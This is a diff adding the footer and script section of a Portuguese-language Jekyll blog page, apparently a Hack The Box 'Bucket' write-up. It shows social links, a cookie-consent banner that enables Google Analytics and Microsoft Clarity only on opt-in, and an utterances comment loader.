+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Pesquisar...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Acompanhe no</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/termos-e-privacidade" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Termos de uso e Política Privacidade</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+      
+    
+    
+    <li><a href="https://davicruz.com/en-US">Also available in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Desenvolvido com <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-bucket');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "Este website utiliza cookies para garantir a você uma melhor experiência";
+    var strDismiss = "Entendi!";
+    var strAllow = "Permitir Cookies";
+    var strDeny = "Não, obrigado!";
+    var strLink = "Saiba Mais";
+    var strHref = "https://davicruz.com/termos-e-privacidade/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
